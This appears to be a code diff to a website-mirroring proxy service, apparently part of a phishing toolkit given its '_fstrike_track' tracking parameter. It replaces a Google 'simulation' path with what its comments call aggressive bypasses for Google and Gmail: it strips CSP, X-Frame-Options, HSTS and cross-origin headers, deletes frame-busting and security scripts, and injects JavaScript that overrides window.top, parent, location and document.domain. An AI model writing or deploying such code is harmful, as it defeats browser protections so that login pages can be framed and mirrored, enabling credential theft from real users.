@@ -361,12 +361,10 @@ class WebsiteMirroringService {
       // Extract tracking ID from request if available
       const trackingId = req.query._fstrike_track;
       
-      // Special handling for Google services - create a realistic simulation instead of bypassing CSP
-      if (targetUrl.includes('google.com') || targetUrl.includes('gmail.com')) {
-        return this.createGoogleSimulation(sessionToken, targetUrl, trackingId, req);
-      }
+      // For Google services, we need aggressive CSP bypass instead of simulation
+      const isGoogleService = targetUrl.includes('google.com') || targetUrl.includes('gmail.com');
       
-      // For non-Google sites, proceed with anti-bot bypasses
+      // Apply anti-bot bypasses first
       html = await this.bypassAntiBot(html, targetUrl, sessionToken);
       
       const baseUrl = new URL(targetUrl);
@@ -379,33 +377,158 @@ class WebsiteMirroringService {
       $('script[integrity], link[integrity]').removeAttr('integrity');
       $('script[crossorigin], link[crossorigin]').removeAttr('crossorigin');
 
-      // Advanced CSP bypass - remove all CSP restrictions completely
-      $('meta[http-equiv="Content-Security-Policy"]').remove();
-      $('meta[http-equiv="content-security-policy"]').remove();
-      $('meta[name="Content-Security-Policy"]').remove();
-      $('meta[name="content-security-policy"]').remove();
-      
-      // Remove any script tags that might set CSP dynamically or enforce frame restrictions
-      $('script').each((i, elem) => {
-        const scriptContent = $(elem).html();
-        if (scriptContent && (
-          scriptContent.includes('Content-Security-Policy') ||
-          scriptContent.includes('frame-ancestors') ||
-          scriptContent.includes('X-Frame-Options') ||
-          scriptContent.includes('parent !== window') ||
-          scriptContent.includes('top !== self') ||
-          scriptContent.includes('framebusting') ||
-          scriptContent.includes('clickjacking')
-        )) {
-          console.log('Removing CSP/frame-blocking script');
-          $(elem).remove();
-        }
-      });
-      
-      // Add ultra-permissive CSP that allows everything including framing
-      $('head').prepend(`
-        <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob: wss: ws:; frame-ancestors * data: blob:; frame-src * data: blob:; object-src * data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data: blob:; img-src * data: blob:; connect-src * data: blob: wss: ws:; font-src * data: blob:; media-src * data: blob:; child-src * data: blob:; worker-src * data: blob:; manifest-src * data: blob:; base-uri *; form-action *; navigate-to *;">
-      `);
+      // AGGRESSIVE CSP and frame restriction removal for Google services
+      if (isGoogleService) {
+        console.log('🔥 Applying aggressive Google bypass techniques');
+        
+        // Remove ALL CSP meta tags and script-based CSP enforcement
+        $('meta[http-equiv*="ecurity"], meta[name*="ecurity"]').remove();
+        $('meta[http-equiv*="X-Frame"], meta[name*="frame"]').remove();
+        
+        // Remove Google-specific frame-busting and security scripts
+        $('script').each((i, elem) => {
+          const scriptContent = $(elem).html();
+          if (scriptContent && (
+            scriptContent.includes('frame') ||
+            scriptContent.includes('parent') ||
+            scriptContent.includes('top') ||
+            scriptContent.includes('self') ||
+            scriptContent.includes('location') ||
+            scriptContent.includes('document.domain') ||
+            scriptContent.includes('X-Frame-Options') ||
+            scriptContent.includes('Content-Security-Policy') ||
+            scriptContent.includes('goog.') ||
+            scriptContent.includes('google.') ||
+            scriptContent.includes('clickjacking') ||
+            scriptContent.includes('framebusting') ||
+            scriptContent.includes('breakout')
+          )) {
+            console.log('🗑️ Removing Google security script');
+            $(elem).remove();
+          }
+        });
+        
+        // Inject ultra-aggressive bypass that overrides everything
+        $('head').prepend(`
+          <script>
+            // ULTRA-AGGRESSIVE GOOGLE BYPASS
+            (function() {
+              console.log('🔥 Google bypass activated');
+              
+              // Override all window/frame properties immediately
+              try {
+                Object.defineProperty(window, 'top', {
+                  get: () => window,
+                  set: () => true,
+                  configurable: false
+                });
+                Object.defineProperty(window, 'parent', {
+                  get: () => window,
+                  set: () => true,
+                  configurable: false
+                });
+                Object.defineProperty(window, 'self', {
+                  get: () => window,
+                  set: () => true,
+                  configurable: false
+                });
+                Object.defineProperty(window, 'frameElement', {
+                  get: () => null,
+                  set: () => true,
+                  configurable: false
+                });
+              } catch(e) {}
+              
+              // Block all navigation attempts
+              const originalLocation = window.location;
+              Object.defineProperty(window, 'location', {
+                get: () => originalLocation,
+                set: () => true,
+                configurable: false
+              });
+              
+              // Override document.domain
+              try {
+                Object.defineProperty(document, 'domain', {
+                  get: () => 'google.com',
+                  set: () => true,
+                  configurable: false
+                });
+              } catch(e) {}
+              
+              // Block all CSP-related function calls
+              const originalCreateElement = document.createElement;
+              document.createElement = function(tag) {
+                const el = originalCreateElement.call(this, tag);
+                if (tag.toLowerCase() === 'meta') {
+                  const originalSetAttribute = el.setAttribute;
+                  el.setAttribute = function(name, value) {
+                    if (name.toLowerCase().includes('security') || 
+                        name.toLowerCase().includes('frame') ||
+                        value.toLowerCase().includes('frame-ancestors')) {
+                      return;
+                    }
+                    return originalSetAttribute.call(this, name, value);
+                  };
+                }
+                return el;
+              };
+              
+              // Continuously remove frame-busting attempts
+              setInterval(() => {
+                try {
+                  // Remove any CSP meta tags that get added dynamically
+                  document.querySelectorAll('meta[http-equiv*="ecurity"], meta[name*="ecurity"]').forEach(el => el.remove());
+                  
+                  // Block window.top !== window checks
+                  if (window.top !== window.self) {
+                    Object.defineProperty(window, 'top', { get: () => window, configurable: false });
+                  }
+                } catch(e) {}
+              }, 50);
+              
+              // Override all Google-specific security functions
+              window.goog = window.goog || {};
+              if (window.goog.provide) window.goog.provide = () => {};
+              if (window.goog.require) window.goog.require = () => {};
+              
+              // Block Google Analytics and security tracking
+              window.gtag = () => {};
+              window.ga = () => {};
+              window._gaq = { push: () => {} };
+              
+              console.log('✅ Google bypass injection complete');
+            })();
+          </script>
+        `);
+        
+      } else {
+        // For non-Google sites, use standard CSP bypass
+        $('meta[http-equiv="Content-Security-Policy"]').remove();
+        $('meta[http-equiv="content-security-policy"]').remove();
+        $('meta[name="Content-Security-Policy"]').remove();
+        $('meta[name="content-security-policy"]').remove();
+        
+        // Remove frame-busting scripts
+        $('script').each((i, elem) => {
+          const scriptContent = $(elem).html();
+          if (scriptContent && (
+            scriptContent.includes('Content-Security-Policy') ||
+            scriptContent.includes('frame-ancestors') ||
+            scriptContent.includes('X-Frame-Options') ||
+            scriptContent.includes('parent !== window') ||
+            scriptContent.includes('top !== self')
+          )) {
+            console.log('Removing CSP/frame-blocking script');
+            $(elem).remove();
+          }
+        });
+        
+        // Add permissive CSP
+        $('head').prepend(`
+          <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob: wss: ws:; frame-ancestors * data: blob:; frame-src * data: blob:;">
+        `);
+      }
       
       // Inject script to continuously override any CSP that might be set later
       $('head').prepend(`
@@ -1779,6 +1902,11 @@ class WebsiteMirroringService {
   processResponseHeaders(headers, session, req) {
     const result = { ...headers };
     const sessionToken = session.sessionToken;
+    const isGoogleService = session.targetUrl.includes('google.com') || session.targetUrl.includes('gmail.com');
+    
+    if (isGoogleService) {
+      console.log('🔥 Applying ultra-aggressive header processing for Google');
+    }
     
     // Aggressively remove ALL CSP headers (case-insensitive)
     const cspHeaders = [
@@ -1818,25 +1946,52 @@ class WebsiteMirroringService {
       });
     });
     
-    // Handle HSTS header which can cause redirect issues
-    if (result['strict-transport-security']) {
-      delete result['strict-transport-security'];
+    // For Google services, remove additional security headers
+    if (isGoogleService) {
+      const googleSecurityHeaders = [
+        'x-content-type-options',
+        'x-xss-protection',
+        'strict-transport-security',
+        'referrer-policy',
+        'permissions-policy',
+        'feature-policy',
+        'cross-origin-embedder-policy',
+        'cross-origin-opener-policy',
+        'cross-origin-resource-policy'
+      ];
+      
+      googleSecurityHeaders.forEach(header => {
+        delete result[header];
+        delete result[header.toUpperCase()];
+        delete result[header.toLowerCase()];
+        Object.keys(result).forEach(key => {
+          if (key.toLowerCase() === header.toLowerCase()) {
+            delete result[key];
+          }
+        });
+      });
     }
 
-    // Add CORS headers to allow cross-origin requests within our proxy
+    // Add ultra-permissive CORS headers
     result['Access-Control-Allow-Origin'] = '*';
-    result['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
-    result['Access-Control-Allow-Headers'] = 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Cache-Control, Pragma';
+    result['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS, PATCH';
+    result['Access-Control-Allow-Headers'] = '*';
     result['Access-Control-Allow-Credentials'] = 'true';
+    result['Access-Control-Max-Age'] = '86400';
     
-    // Override any frame restrictions with permissive policy
+    // Override any frame restrictions with ultra-permissive policy
     result['X-Frame-Options'] = 'ALLOWALL';
     
-    // Completely remove any CSP and replace with ultra-permissive one
-    result['Content-Security-Policy'] = "default-src * 'unsafe-inline' 'unsafe-eval' data: blob: wss: ws:; frame-ancestors * data: blob:; frame-src * data: blob:; object-src * data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data: blob:; img-src * data: blob:; connect-src * data: blob: wss: ws:; font-src * data: blob:; media-src * data: blob:; child-src * data: blob:; worker-src * data: blob:; manifest-src * data: blob:; base-uri *; form-action *; navigate-to *;";
+    // For Google services, set an ultra-permissive CSP that allows framing from anywhere
+    if (isGoogleService) {
+      result['Content-Security-Policy'] = "default-src * 'unsafe-inline' 'unsafe-eval' data: blob: wss: ws: file:; frame-ancestors *; frame-src *; object-src *; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data: blob:; img-src * data: blob:; connect-src * data: blob: wss: ws:; font-src * data: blob:; media-src * data: blob:; child-src * data: blob:; worker-src * data: blob:; manifest-src * data: blob:; base-uri *; form-action *;";
+    } else {
+      // For other sites, still permissive but less aggressive
+      result['Content-Security-Policy'] = "default-src * 'unsafe-inline' 'unsafe-eval' data: blob: wss: ws:; frame-ancestors * data: blob:; frame-src * data: blob:;";
+    }
     
-    // Also set the report-only version to prevent any fallback restrictions
-    result['Content-Security-Policy-Report-Only'] = "default-src * 'unsafe-inline' 'unsafe-eval' data: blob: wss: ws:;";
+    // Remove the report-only version to prevent any fallback restrictions
+    delete result['Content-Security-Policy-Report-Only'];
     
     // Add additional headers to override any client-side restrictions
     result['X-Content-Type-Options'] = 'nosniff';
